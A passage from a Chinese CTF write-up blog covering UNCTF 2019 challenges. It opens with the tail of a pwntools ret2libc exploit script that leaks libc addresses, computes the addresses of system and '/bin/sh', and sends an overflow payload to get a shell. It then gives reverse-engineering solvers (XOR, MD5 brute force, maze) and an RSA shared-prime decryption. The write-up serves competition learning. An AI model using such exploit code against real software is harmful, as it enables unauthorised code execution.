CTFer!"</span>)[<span class="number">1</span>:<span class="number">5</span>]) </span><br><span class="line">print(hex(main_libc_addr)) </span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x20</span>+p32(<span class="number">1717986918</span>)) </span><br><span class="line">obj = LibcSearcher(<span class="string">"puts"</span>, puts_libc_addr) </span><br><span class="line">obj.add_condition(<span class="string">"__libc_start_main"</span>, main_libc_addr) </span><br><span class="line">print(hex(obj.dump(<span class="string">'puts'</span>))) </span><br><span class="line">print(hex(obj.dump(<span class="string">'__libc_start_main'</span>))) </span><br><span class="line">print(hex(obj.dump(<span class="string">'system'</span>))) </span><br><span class="line">print(hex(obj.dump(<span class="string">'str_bin_sh'</span>))) </span><br><span class="line">libcbase_addr=puts_libc_addr-obj.dump(<span class="string">'puts'</span>) </span><br><span class="line">system_addr=libcbase_addr+obj.dump(<span class="string">'system'</span>) </span><br><span class="line">print(<span class="string">"system_addr:"</span>) </span><br><span class="line">print(hex(system_addr)) </span><br><span class="line">binsh_addr=libcbase_addr+obj.dump(<span class="string">'str_bin_sh'</span>) </span><br><span class="line">print(<span class="string">"binsh_addr:"</span>) </span><br><span class="line">print(hex(binsh_addr)) </span><br><span class="line">p.sendlineafter(<span class="string">"What is your name?"</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'a'</span>*<span class="number">4</span>+p32(<span class="number">0x08048591</span>)+p32(system_addr)+p32(puts_addr)+p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>对目标数组进行异或变换</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) == key )                      </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; key; i += <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5[i] = key ^ (a1[i] + <span class="number">6</span>);                </span><br><span class="line">      v4[i + <span class="number">1</span>] = (a1[i + <span class="number">1</span>] - <span class="number">6</span>) ^ key;        </span><br><span class="line">      v3[i + <span class="number">2</span>] = a1[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ key;          </span><br><span class="line">      *(_BYTE *)(a2 + i) = v5[i];</span><br><span class="line">      *(_BYTE *)(a2 + i + <span class="number">1L</span>L) = v4[i + <span class="number">1</span>];</span><br><span class="line">      *(_BYTE *)(a2 + i + <span class="number">2L</span>L) = v3[i + <span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<p>Decrypt.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'izwhroz""w"v.K".Ni'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x12</span>):</span><br><span class="line">  <span class="keyword">if</span> i%<span class="number">3</span>==<span class="number">0</span>:</span><br><span class="line">    flag+=chr((ord(s[i])^<span class="number">0x12</span>)<span class="number">-0x6</span>)</span><br><span class="line">  <span class="keyword">elif</span> i%<span class="number">3</span>==<span class="number">1</span>:</span><br><span class="line">    flag+=chr((ord(s[i])^<span class="number">0x12</span>)+<span class="number">0x6</span>)</span><br><span class="line">  <span class="keyword">elif</span> i%<span class="number">3</span>==<span class="number">2</span>:</span><br><span class="line">    flag+=chr(ord(s[i])^<span class="number">0x12</span>^<span class="number">0x6</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#unctf&#123;b66_6b6_66b&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h3><p>程序意思是将checkbox作为字典，flag分成两段，满足checkbox=16*v3+v12</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0xAD</span>,<span class="number">0x46</span>,<span class="number">0x1E</span>,<span class="number">0x20</span>,<span class="number">0x3C</span>,<span class="number">0x79</span>,<span class="number">0x75</span>,<span class="number">0xB3</span>,<span class="number">0x5E</span>,<span class="number">0x52</span>,<span class="number">0x79</span>,<span class="number">0x60</span>,<span class="number">0xCB</span>,<span class="number">0xFE</span>,<span class="number">0xB0</span>,<span class="number">0x6C</span>]</span><br><span class="line">b = [<span class="number">48</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">102</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(a)):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b)):</span><br><span class="line">       <span class="keyword">if</span>((b[i]&gt;<span class="number">47</span> <span class="keyword">and</span> b[i]&lt;=<span class="number">57</span>)):tmp = b[i] <span class="number">-48</span></span><br><span class="line">       <span class="keyword">else</span>: tmp = b[i] - <span class="number">87</span></span><br><span class="line">       <span class="keyword">if</span>((b[j]&gt;<span class="number">47</span> <span class="keyword">and</span> b[j]&lt;=<span class="number">57</span>)):mmp = b[j] <span class="number">-48</span></span><br><span class="line">       <span class="keyword">else</span>: mmp = b[j] - <span class="number">87</span></span><br><span class="line">       <span class="keyword">if</span> ((tmp*<span class="number">16</span>+mmp) == a[x]) :</span><br><span class="line">         flag += chr(b[i])</span><br><span class="line">         flag += chr(b[j]) </span><br><span class="line"><span class="comment"># ad461e203c7975b35e527960cbfeb06c</span></span><br></pre></td></tr></table></figure>

<h3 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy-Android"></a>Easy-Android</h3><p>用工具反编译后，Java源码中对flag进行md5加密和异或操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a=[<span class="string">"2061e19de42da6e0de934592a2de3ca0"</span>,<span class="string">"a81813dabd92cefdc6bbf28ea522d2d1"</span>,<span class="string">"4b98921c9b772ed5971c9eca38b08c9f"</span>,<span class="string">"81773872cbbd24dd8df2b980a2b47340"</span>,<span class="string">"73b131aa8e4847d27a1c20608199814e"</span>,<span class="string">"bbd7c4e20e99f0a3bf21c148fe22f21d"</span>,<span class="string">"bf268d46ef91eea2634c34db64c91ef2"</span>,<span class="string">"0862deb943decbddb87dbf0eec3a06cc"</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">                b=<span class="string">""</span>+chr(i)+chr(j)+chr(k)+chr(l)</span><br><span class="line">                cipher=hashlib.md5(b.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">0</span>]):</span><br><span class="line">                    c=<span class="string">"flag"</span></span><br><span class="line">                    d1=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d1+=chr(e)</span><br><span class="line">                    print(<span class="string">'flag[0]'</span>,d1)</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">1</span>]):</span><br><span class="line">                    c=<span class="string">"&#123;thi"</span></span><br><span class="line">                    d2=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d2+=chr(e)</span><br><span class="line">                    print(<span class="string">'flag[1]'</span>,d2)</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">2</span>]):</span><br><span class="line">                    c=<span class="string">"s_is"</span></span><br><span class="line">                    d3=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d3+=chr(e)</span><br><span class="line">                    print(<span class="string">'flag[2]'</span>,d3)</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">3</span>]):</span><br><span class="line">                    c=<span class="string">"_a_f"</span></span><br><span class="line">                    d4=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d4+=chr(e)</span><br><span class="line">                    print(<span class="string">'flag[3]'</span>,d4)</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">4</span>]):</span><br><span class="line">                    c=<span class="string">"ake_"</span></span><br><span class="line">                    d5=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d5+=chr(e)</span><br><span class="line">                    print(<span class="string">'flag[4]'</span>,d5)</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">5</span>]):</span><br><span class="line">                    c=<span class="string">"flag"</span></span><br><span class="line">                    d6=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d6+=chr(e)</span><br><span class="line">                    print(<span class="string">'flag[5]'</span>,d6)</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">6</span>]):</span><br><span class="line">                    c=<span class="string">"_ahh"</span></span><br><span class="line">                    d7=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d7+=chr(e)</span><br><span class="line">                    print(<span class="string">'flag[6]'</span>,d7)</span><br><span class="line">                <span class="keyword">if</span>(cipher==a[<span class="number">7</span>]):</span><br><span class="line">                    c=<span class="string">"hhh&#125;"</span></span><br><span class="line">                    d8=<span class="string">""</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        e=ord(b[i])^ord(c[i])</span><br><span class="line">                        d8+=chr(e)</span><br><span class="line">                        print(<span class="string">''</span>)</span><br><span class="line">                    print(<span class="string">'flag[7]'</span>,d8)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">flag[0] bd1d</span></span><br><span class="line"><span class="string">flag[7] ccfa</span></span><br><span class="line"><span class="string">flag[2] f1d3</span></span><br><span class="line"><span class="string">flag[3] f5a1</span></span><br><span class="line"><span class="string">flag[1] 6ba7</span></span><br><span class="line"><span class="string">flag[4] 3ebb</span></span><br><span class="line"><span class="string">flag[5] 0a75</span></span><br><span class="line"><span class="string">flag[6] 844c</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p>查壳：UPolyX v0.5 *，ESP定律脱壳 ，flag分为三段进行加密，逆向解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">encode1=[<span class="number">0x66</span>,<span class="number">0x6D</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x7f</span>,<span class="number">0x37</span>,<span class="number">0x35</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x6b</span>,<span class="number">0x3a</span>,<span class="number">0x3c</span>,<span class="number">0x3b</span>,<span class="number">0x20</span>]</span><br><span class="line">encode2=[<span class="number">0x37</span>,<span class="number">0x6f</span>,<span class="number">0x38</span>,<span class="number">0x62</span>,<span class="number">0x36</span>,<span class="number">0x7c</span>,<span class="number">0x37</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x76</span>,<span class="number">0x33</span>,<span class="number">0x62</span>,<span class="number">0x64</span>,<span class="number">0x7a</span>]</span><br><span class="line">encode3=[<span class="number">0x1a</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x51</span>,<span class="number">0x5</span>,<span class="number">0x11</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x59</span>,<span class="number">0x1d</span>,<span class="number">0x9</span>,<span class="number">0x5d</span>,<span class="number">0x12</span>,<span class="number">0</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">decode2=<span class="string">'7'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(encode1)):</span><br><span class="line">  flag+=chr(i^encode1[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(encode2)<span class="number">-1</span>):</span><br><span class="line">  decode2+=chr(encode1[i+<span class="number">1</span>]^encode2[i+<span class="number">1</span>]^encode1[i])</span><br><span class="line">flag+=decode2+<span class="string">'-'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(encode1)<span class="number">-1</span>):</span><br><span class="line">  flag+=chr(i^(encode3[i+<span class="number">1</span>]^ord(decode2[i])))</span><br><span class="line"><span class="comment"># flag&#123;2378b077-7d6e-4564-bdca-7eec8eede9a2&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Easy-Maze"><a href="#Easy-Maze" class="headerlink" title="Easy_Maze"></a>Easy_Maze</h3><p>由于加密的迷宫以及解密的函数都给了，利用gdb调试到走迷宫的函数，显示出sp，写出迷宫就能写出flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb&gt; x/<span class="number">49</span>xw $sp+<span class="number">8</span></span><br><span class="line"><span class="number">0x7fffffffdf20</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdf30</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdf40</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffffffdf50</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdf60</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdf70</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffffffdf80</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffffffdf90</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdfa0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdfb0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdfc0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x7fffffffdfd0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffffffdfe0</span>:	<span class="number">0x00000001</span></span><br><span class="line">迷宫:</span><br><span class="line"><span class="number">1001111</span></span><br><span class="line"><span class="number">1011001</span></span><br><span class="line"><span class="number">1110111</span></span><br><span class="line"><span class="number">0001100</span></span><br><span class="line"><span class="number">1111000</span></span><br><span class="line"><span class="number">1000111</span></span><br><span class="line"><span class="number">1111101</span></span><br><span class="line">flag : UNCTF&#123;ssddwdwdddssaasasaaassddddwdds&#125;</span><br></pre></td></tr></table></figure>

<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="不仅仅是RSA"><a href="#不仅仅是RSA" class="headerlink" title="不仅仅是RSA"></a>不仅仅是RSA</h3><p>视频利用运行脚本得到两段密文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#n1 = 0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B</span></span><br><span class="line">n1 = <span class="number">10285341668836655607404515118077620322010982612318568968318582049362470680277495816958090140659605052252686941748392508264340665515203620965012407552377979</span></span><br><span class="line">e =<span class="number">0xa105</span></span><br><span class="line">p1 = <span class="number">95652716952085928904432251307911783641637100214166105912784767390061832540987</span></span><br><span class="line">q1 = <span class="number">107527961531806336468215094056447603422487078704170855072884726273308088647617</span></span><br><span class="line">c1 = <span class="number">4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span></span><br><span class="line"><span class="comment">#n2 = 0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553</span></span><br><span class="line">n2 = <span class="number">8559553750267902714590519131072264773684562647813990967245740601834411107597211544789303614222336972768348959206728010238189976768204432286391096419456339</span></span><br><span class="line">p2 = <span class="number">89485735722023752007114986095340626130070550475022132484632643785292683293897</span></span><br><span class="line">q2 = <span class="number">95652716952085928904432251307911783641637100214166105912784767390061832540987</span></span><br><span class="line">c2 = <span class="number">485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span></span><br><span class="line">d1 = gmpy2.invert(e,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))</span><br><span class="line">d2 = gmpy2.invert(e,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line">print(libnum.n2s(m1))</span><br><span class="line">print(libnum.n2s(m2))</span><br><span class="line"><span class="comment">#UNCTF&#123;ac01dff95336aa470e3b55d3fe43e9f6&#125;</span></span><br></pre></td></tr></table></figure></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/10/28/UNCTF/">https://nikoeurus.github.io/2019/10/28/UNCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/11/03/2019%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9Bwp/"><i class="fa fa-chevron-left">  </i><span>2019 上海市大学生网络空间安全大赛Web部分题解WriteUp</span></a></div><div class="next-post pull-right"><a href="/2019/10/14/RoarCTF/"><span>2019 RoarCTF部分题解WriteUp</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>